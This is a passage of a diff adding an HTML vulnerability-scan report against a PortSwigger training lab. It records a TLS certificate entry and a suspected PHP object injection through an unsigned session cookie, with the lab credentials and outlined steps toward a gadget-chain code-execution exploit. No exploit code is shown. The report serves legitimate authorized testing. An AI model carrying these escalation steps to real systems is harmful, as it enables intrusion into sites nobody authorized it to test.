+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                            &lt;a href=&quot;/my-account&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;h1&gt;Login&lt;/h1&gt;
+                    &lt;section&gt;
+                        &lt;form class=login-form method=POST action=&quot;/login&quot;&gt;
+                            &lt;label&gt;Username&lt;/label&gt;
+                            &lt;input required type=username name=&quot;username&quot; autofocus&gt;
+                            &lt;label&gt;Password&lt;/label&gt;
+                            &lt;input required type=password name=&quot;password&quot;&gt;
+                            &lt;button class=button type=submit&gt; Log in &lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/section&gt;
+                    &lt;!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated --&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 6. [burp] TLS certificate</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The server presented a valid, trusted TLS certificate. This issue is purely informational.&lt;br&gt;&lt;br&gt;The server presented the following certificates:&lt;br&gt;&lt;br&gt;&lt;h4&gt;Server certificate&lt;/h4&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Issued to:&lt;/b&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td&gt;*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Issued by:&lt;/b&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Amazon RSA 2048 M01&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Valid from:&lt;/b&gt;&amp;nbsp;&amp;nb @ https://0a14001003ba06e480069a13001b0048.web-security-academy.net/</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr661nym-2z</code> — <code>artifacts/_/ev-mr661nym-2z/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0</pre></div>
+</div>
+<h2 id="suspected">Suspected (needs manual verification)</h2>
+<p class="muted">Leads with one concrete anomaly but without control+2-replay confirmation — verify before relying on them.</p>
+<div class="f" id="finding-7">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#b00020">CRITICAL</span> 7. [rce] PHP object injection via session cookie — likely escalates to remote code execution</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0a14001003ba06e480069a13001b0048.web-security-academy.net/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> Session cookie is a client-controlled base64 PHP-serialized User object fed directly to unserialize() (no signature). Crafted serialized payloads reach the deserializer and trigger 500-level unserialize errors, confirming a PHP object-injection sink; a gadget chain would very likely yield RCE, but none was built in this bounded diagnosis.</div>
+<div class="desc">The `session` cookie issued by POST /login is an attacker-controlled base64 PHP-serialized object that the server passes to `unserialize()` without integrity checks (confirmed sink — see f-001). PHP object injection of this kind is RCE-class: with a suitable POP/gadget chain reachable in the application's autoloaded classes (or a PHAR deserialization vector), an attacker can instantiate arbitrary objects and drive magic methods (__wakeup/__destruct/__toString) to file read/write, SSRF, or command execution. I confirmed the deserialization sink (malformed and crafted serialized payloads both reach `unserialize()` and error with HTTP 500) but did not build/deliver a working gadget chain within this bounded login-screen diagnosis — hence recorded as a suspected lead for manual verification (identify available gadget classes, e.g. via source disclosure / a leaked class, then craft the chain).</div>
+<div><b>Reproduction</b></div><pre>1. Obtain the serialized session cookie (POST /login wiener:peter → base64 `O:4:&quot;User&quot;:2:{...}`).
+2. Confirm the sink: supply a crafted serialized object as the cookie → server 500s on `unserialize()` (ev-mr62x7ou-f). 
+3. Escalation (not completed here): enumerate autoloadable classes with exploitable magic methods, craft a POP chain (or PHAR), inject it via the `session` cookie, and confirm code execution / file access out-of-band.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr62x7ou-f</code> — <code>artifacts/s-0002/ev-mr62x7ou-f/</code></div><div class="lbl">REQUEST</div><pre>GET /my-account HTTP/1.1
+Host: 0a14001003ba06e480069a13001b0048.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+content-length: 3407
+content-type: text/html; charset=utf-8
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a id='lab-link' class='button' href='/'&gt;Back to lab home&lt;/a&gt;
+                            &lt;button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'&gt;Submit solution&lt;/button&gt;
+                            &lt;script src='/resources/labheader/js/submitSolution.js'&gt;&lt;/script&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Rlc2VyaWFsaXphdGlvbi9leHBsb2l0aW5nL2xhYi1kZXNlcmlhbGl6YXRpb24tZGV2ZWxvcGluZy1hLWN1c3RvbS1nYWRnZXQtY2hhaW4tZm9yLXBocC1kZXNlcmlhbGl6YXRpb24='&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-notsolved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Not solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;h4&gt;Internal Server Error&lt;/h4&gt;
+                    &lt;p class=is-warning&gt;PHP Fatal error:  Uncaught Exception: Invalid user administrator in /var/www/index.php:7
+Stack trace:
+#0 {main}
+  thrown in /var/www/index.php on line 7&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
